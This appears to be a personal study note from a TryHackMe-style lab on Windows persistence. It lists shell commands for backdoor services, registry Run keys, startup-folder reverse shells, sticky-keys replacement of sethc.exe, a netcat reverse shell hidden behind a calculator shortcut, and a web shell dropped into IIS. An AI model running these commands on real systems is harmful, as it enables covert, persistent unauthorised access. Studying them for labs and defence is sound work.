---
dg-publish: true
---






## ==Special Privileges==

```Shell
secedit /export /cfg config.inf

secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

- Creates a file for assigning privs.

## ==RID Hijacking==

```Shell
wmic useraccount get name,sid
```

## ==Shortcut Files==

```Shell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe [IP]"

C:\Windows\System32\calc.exe
```

- Changes the shortcut of calculator shortcut on desktop.

## ==Creating Backdoor Services==

```Shell
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto

sc.exe start THMservice
```

- After this, create an exe in metasploit and copy it to target.

## ==Modifying Existing Services==

```Shell
sc.exe query state=all
```

- List of available services using this command.

  

- Can be done using the same method for abusing scheduled tasks.

## ==Logon Triggered Persistence==

### ==With Startup Folders==

- Generate a reverse shell in msfvenom.
- Copy it to http.server with Python3 and wget.

```Shell
copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### ==Run / RunOnce==

- Force a user to execute a program on logon via the registry.
- Can use the following registry entries to specify applications to run at logon:

```Shell
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

- Create a revshell and move to the target.

### ==Logon Scripts==

- Create a revshell, move it to the target.
- Create an env-var in registry.
- Add the entry to point to the payload so it gets loaded.

## ==Backdooring Login Screens==

### ==Sticky Keys==

```Shell
takeown /f c:\Windows\System32\sethc.exe

icacls C:\Windows\System32\sethc.exe /grant Administrator:F

copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

- After this, pressing SHIFT 5 times to access a terminal with SYS priv directly from login screen.
- Same for utilman.

## ==Persisting through Existing Services==

### ==Using Web Shells==

```Shell
move shell.aspx C:\inetpub\wwwroot\
```